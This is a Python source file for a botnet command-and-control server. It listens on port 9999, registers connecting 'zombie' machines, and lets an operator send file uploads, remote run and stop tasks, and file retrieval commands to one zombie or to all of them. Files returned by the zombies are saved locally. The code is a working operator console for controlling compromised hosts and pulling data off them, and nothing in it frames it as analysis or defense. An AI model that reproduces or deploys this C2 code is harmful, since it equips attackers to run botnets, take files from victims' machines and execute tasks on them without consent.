import sys
from socket import *
import select
import _thread
import time
import io

class ComandAndControlServer:

    def __init__(self):
        self.zombieList = {}
        self.taskList = {}
        self.taskNumber = 0
        self.serverSocket = socket(AF_INET,SOCK_STREAM)
        self.serverSocket.bind(('',9999))
        self.serverSocket.listen(5)

    def connect(self):
        while True:
            connectionSocket, address = self.serverSocket.accept()
            name = connectionSocket.recv(1024).decode()

            
            newZombie = ZombieHandler(connectionSocket, address, name)
            self.zombieList[name] = newZombie


    def run(self):
        _thread.start_new_thread(self.connect,())

        while True:
            command = input("Enter the comand: ")

            if command == "zombies":
                print(self.zombieList)
                continue
            if command == "tasks":
                print(self.taskList)
                continue


            
            try:
                zombieName = command.split("||")[0]
                Req = command.split("||")[1]
                if (Req == "SEND" or Req == "RUN" or Req == "STOP" or Req == "RETURN" or Req == "GET"):
                    DURL = command.split("||")[2]
                    if (Req == "SEND" or Req == "RETURN" or Req == "GET"):
                        LURL = command.split("||")[3]
                    else:
                        LURL = ""
                        
                    if Req == "RUN":
                        self.taskList[self.taskNumber]=command
                        print("Task  "+ str(self.taskNumber)+" : "+command)
                        if zombieName == "ALL":
                            for key in self.zombieList:
                                self.zombieList[key].request(Req,DURL,LURL,self.taskNumber)

                        else:
                            self.zombieList[zombieName].request(Req,DURL,LURL,self.taskNumber)
                        self.taskNumber = self.taskNumber + 1
                    else:
                        if zombieName == "ALL":
                            for key in self.zombieList:
                                self.zombieList[key].request(Req,DURL,LURL,self.taskNumber)

                        else:
                            self.zombieList[zombieName].request(Req,DURL,LURL,self.taskNumber)
                        
                else:
                    print("Invalid Command")
                    continue
            except:
                print("Wrong format")


class ZombieHandler:

    def __init__(self,connectionSocket,address,name):
        self.socket = connectionSocket
        self.address = address
        self.name = name



    def send(self,message):
        self.socket.send(message.encode())

    def receive(self,req,dURL,lURL):
        buffer = ""
        while True:
            r = self.socket.recv(1024).decode()
            buffer = buffer + r
            if "\r\n\r\n" in buffer:
                lines = buffer.split("\r\n")
                line = lines[0].split(" ")
                respondNumber = int(line[0])

                if respondNumber == 1:
                    print("==============="+self.name+"===============")
                    print(lines[0][2:])
                    buffer=""
                    break
                    
                if respondNumber == 2:
                    print("==============="+self.name+"===============")
                    print(lines[0][2:])
                    buffer=""
                    break
                    
                if respondNumber == 9:
                    print("==============="+self.name+"===============")
                    print(lines[0][2:])
                    buffer=""
                    break
                    
                if respondNumber == 3:
                    print("==============="+self.name+"===============")
                    print(lines[0][2:])
                    buffer=""
                    break
                    
                if respondNumber == 4:
                    print("==============="+self.name+"===============")
                    print(lines[0][2:])
                    buffer=""
                    break
                
                if respondNumber == 5:
                    print("==============="+self.name+"===============")
                    print(lines[0][2:])
                    buffer=""
                    break
                    
                if respondNumber == 7:
                    print("==============="+self.name+"===============")
                    print(lines[0][2:])
                    buffer=""
                    break
                    
                if respondNumber == 10:
                    print("==============="+self.name+"===============")
                    print(lines[0][3:])
                    buffer=""
                    break

                if respondNumber == 11:
                    print("==============="+self.name+"===============")
                    print(lines[0][3:])
                    buffer=""
                    break

                if respondNumber == 12:
                    print("==============="+self.name+"===============")
                    print(lines[0][3:])
                    buffer=""
                    break

                if respondNumber == 6:


                    #print(len(buffer[buffer.index("\r\n\r\n")+4:]))

                    cPoint = buffer.index("\r\n\r\n")
                    expectLen = int(lines[1].split(" ")[1])
                    actualLen = len(buffer[cPoint+4:])
                    if actualLen < expectLen:
                        continue
                    else:
                        data = buffer[cPoint+4:cPoint+4+expectLen]
                        print("==============="+self.name+"===============")
                        print(lines[0][2:])
                        print("Data:\r\n"+data)
                        file = open(lURL,"w")
                        file.write(data)
                        file.close()
                        buffer=""
                        break

                if respondNumber == 8:
                    cPoint = buffer.index("\r\n\r\n")
                    expectLen = int(lines[1].split(" ")[1])
                    actualLen = len(buffer[cPoint+4:])
                    if actualLen < expectLen:
                        continue
                    else:
                        data = buffer[cPoint+4:cPoint+4+expectLen]
                        print("==============="+self.name+"===============")
                        print(lines[0][2:])
                        print("Data:\r\n"+data)
                        file = open(lURL,"w")
                        file.write(data)
                        file.close()
                        buffer=""
                        break
    

    def request(self,req,dURL,lURL,tNumber):    #dURL for destination URL, lURL for local
        message = req+" "+dURL+"\r\n"+"Content Length: "
        if (req == "SEND"):
            try:
                file = open(lURL,"r")
                data = file.read()
                message = message+str(len(data))+"\r\n\r\n"
                message = message+data
                file.close()
                self.send(message)
                self.receive(req,dURL,lURL)
                
            except:
                print("No such local file, please check")
        elif req == "RUN":
            message = message+"0"+"\r\n"
            message = message+"TaskID: "+str(tNumber)+"\r\n\r\n"
            self.send(message)
            #print(message)
            self.receive(req,dURL,lURL)
        else:
            message = message+"0"+"\r\n\r\n"
            self.send(message)

            #print("================message================")
            #print(message)
            
            self.receive(req,dURL,lURL)

                    
                


if __name__ == "__main__":
    server = ComandAndControlServer()
    server.run()
    
